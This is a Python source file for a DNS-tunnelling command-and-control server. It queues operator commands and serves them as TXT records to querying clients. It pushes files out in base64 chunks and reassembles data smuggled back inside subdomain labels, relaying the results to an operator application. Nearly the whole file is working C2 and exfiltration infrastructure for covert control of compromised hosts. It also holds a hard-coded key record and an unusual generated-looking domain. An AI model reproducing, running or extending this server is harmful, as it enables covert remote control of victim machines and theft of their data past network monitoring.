#!/usr/bin/env python
"""
LICENSE http://www.apache.org/licenses/LICENSE-2.0
"""

import argparse
import datetime
import sys
import time
import threading
import traceback
import base64
import socketserver
import struct
try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)

command_queue = []
file_chunks = []


queue_lock = threading.Lock()

class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


D = DomainName('postaxabaal-exudogodom-cofetofasion.com.')
IP = '127.0.0.1'
TTL = 0

soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.andrei,  # email of the domain administrator
    times=(
        201307231,  # serial number
        60 * 60 * 1,  # refresh
        60 * 60 * 3,  # retry
        60 * 60 * 24,  # expire
        60 * 60 * 1,  # minimum
    )
)

def get_latest_command():
    if command_queue:
        return command_queue.pop()
    return "NoCommands"
 
def command_receiver():
    import socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("127.0.0.1", 9000))
    server_socket.listen(5)
    print("Command receiver started on port 9000.")
    while True:
        client_socket, addr = server_socket.accept()
        command = client_socket.recv(1024).decode("utf-8").strip()
        command_queue.append(command)
        if command.startswith("upload "):
            filename = command.split(" ", 1)[1]
            try:
                with open(filename, "rb") as f:
                    content = f.read()
                    if not content:
                        print("[ERROR] File is empty.")
                    file_data = base64.b64encode(content).decode('utf-8')
                    chunk_size = 200
                    file_chunks[:] = [file_data[i:i+chunk_size] for i in range(0, len(file_data), chunk_size)]
                    #file_chunks.append("EOF")  # End of file indicator
            except Exception as e:
                print(f"Failed to read file: {e}")
                file_chunks.clear()
        
        #print(f"Received command: {command}")
        #print(f"Current command queue: {command_queue}")
        client_socket.close()

thread1 = threading.Thread(target=command_receiver)
thread1.daemon = True
thread1.start()


ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
    D.ns2: [A(IP)],
    D.mail: [A(IP)],
    D.andrei: [CNAME(D)],
    D.VsendKey: [TXT("AA11bb22CC33dd44EE55FF66gg77HH88!!@@##")],
    D.sendCommands: [TXT(get_latest_command())],
}



def send_response_to_wpf(response):
    import socket
    wpf_ip = "127.0.0.1"  # IP of the machine running the WPF application
    wpf_port = 9001       # Port for sending the response

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        try:
            sock.connect((wpf_ip, wpf_port))
            sock.sendall(response.encode('utf-8'))
            #print(f"Sent response to WPF: {response}")
        except Exception as e:
            print(f"Failed to send response: {e}")


import base64

def isBase64(s):
    try:
        return base64.b64encode(base64.b64decode(s)) == s
    except Exception:
        return False
    

response_chunks = {}

def dns_response(data):
    request = DNSRecord.parse(data)
    global file_chunks
    #print(request)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    #print(f"Domain name queried: {qname}")
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
        

    if qn == D or qn.endswith('.' + D):

        if qn.startswith('ResponseChunk'):
            #print(f"Response received : {qn}")
            global response_chunks
            chunk_index = int(qn.split('.')[0].replace('ResponseChunk', ''))
            chunk_data = qn.split('.')[1]  # Extract actual data
            if chunk_data[-4:]=="EORC":
                response_chunks[chunk_index] = chunk_data[:-4]
            else:
                response_chunks[chunk_index] = chunk_data
            #print(chunk_data)
            if chunk_data[-4:]=="EORC":
                
                parts = sorted(response_chunks.items())  # Sort chunks by index
                full_response = "".join(chunk[1] for chunk in parts).replace('-', '=')
                
                decoded_data = base64.b64decode(full_response).decode("utf-8")  
                #print(decoded_data)
                send_response_to_wpf(decoded_data)
                response_chunks.clear()
            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=TXT(qn)))
            return reply.pack()

        if qn.startswith('Response'):
            #print(f"Response received : {qn}")
            send_response_to_wpf(qn.split('.')[0])
            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=TXT(qn)))
            return reply.pack()

        if qn.startswith('sendCommands.'):
            latest_command = get_latest_command()
            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=TXT(latest_command)))
            return reply.pack()
        
        if qn.startswith('sendFile.'):
            if file_chunks:
                chunk = file_chunks.pop(0)
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=TXT(chunk)))
            else:
                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=TXT("NoMoreChunks")))
            return reply.pack()

        if qn.startswith('s-f'):
            chunk_with_domain = qn[3:]  # Remove 's-f'
            chunk = chunk_with_domain.split('.')[0]  # Extract only the chunk part
            # Replace '-' back to '='
            chunk = chunk.replace("-", "=")

            if chunk == "NoMoreChunks":
                print("[INFO] Received all chunks. Reconstructing...")

                full_data = "".join(file_chunks)
                try:
                    decoded = base64.b64decode(full_data)
                    with open("received_file.txt", "wb") as f:
                        f.write(decoded)
                    print("[SUCCESS] File saved as 'received_file.txt'")
                except Exception as e:
                    print(f"[ERROR] Base64 decode failed: {e}")

                file_chunks = []
            else:
                file_chunks.append(chunk)



        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    #print("---- Reply:\n", reply)

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],self.client_address[1]))
        try:
            data = self.get_data()
            #print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
    parser.add_argument('--port', default=5053, type=int, help='The port to listen on.')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
    
    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")

    print("Starting nameserver...")

    servers = []
    if args.udp: servers.append(socketserver.ThreadingUDPServer(('', args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer(('', args.port), TCPRequestHandler))
    
    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()